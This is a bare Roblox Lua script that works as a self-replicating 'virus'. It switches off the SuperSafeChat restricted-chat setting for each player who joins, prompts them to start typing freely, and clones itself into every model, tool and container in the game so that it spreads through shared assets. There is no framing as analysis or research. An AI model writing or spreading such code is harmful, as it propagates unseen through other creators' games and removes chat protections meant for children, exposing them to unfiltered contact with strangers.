if (script.Parent == workspace) then
	function checkForAndSwitch(player)
		if (player.SuperSafeChat == true) then
			player.SuperSafeChat = false;
			wait(5);
			local m = Instance.new("Message");
			m.Text = "Press the / key to start typing.";
			m.Parent = player;
			wait(5);
			m.Text = "Then press Enter to send your message.";
			wait(5);
			m:Remove();
			m = nil;
		end
		player = nil;
		collectgarbage("collect");
	end

	function onChildAddedToPlayers(obj)
		if (obj.className == "Player") then
			checkForAndSwitch(obj);
			local m = Instance.new("Message");
			m.Text = "welcome me place!!!";
			m.Parent = obj;
			wait(5);
			m:Remove();
			m = nil;
		end
		obj = nil;
		collectgarbage("collect");
	end

	function onChildAddedToWorkspace(obj)
		if (obj.className == "Model") then
			if (game.Players:playerFromCharacter(obj) ~= nil) then
				checkForAndSwitch(game.Players:playerFromCharacter(obj));
			end
		end
		obj = nil;
		collectgarbage("collect");
	end

	function findLowestLevel(obj)
		local c = obj:GetChildren();
		local lowestLevel = true;

		for i, v in pairs(c) do
			if (v.className == "Model" or v.className == "Tool" or v.className == "HopperBin" or v == workspace or v == game.Lighting or v == game.StarterPack) then
				lowestLevel = false;
				wait();
				findLowestLevel(v);
			end
		end

		if (obj ~= workspace and lowestLevel == true and (obj:FindFirstChild(script.Name) == nil)) then
			if (obj ~= game.Lighting and obj ~= game.StarterPack) then
				local s = script:Clone();
				s.Parent = obj;
			end
		end
	end

	findLowestLevel(game);

	game.Players.ChildAdded:connect(onChildAddedToPlayers);
	game.Workspace.ChildAdded:connect(onChildAddedToWorkspace);
else
	local findScript = workspace:FindFirstChild(script.Name);

	if (findScript == nil) then
		local s = script:Clone();
		s.Parent = workspace;
	end
end

--[[function findAllCopies(obj)
	local c = obj:GetChildren();

	for i, v in pairs(c) do
		if (v.Name == script.Name and v.className == "Script" and v ~= script) then
			v.Parent = nil;
		elseif (v.className == "Model" or v.className == "Tool" or v.className == "HopperBin" or v == workspace or v == game.Lighting or v == game.StarterPack) then
			findAllCopies(v);
		end
	end
end

findAllCopies(game);

script.Parent = nil;]]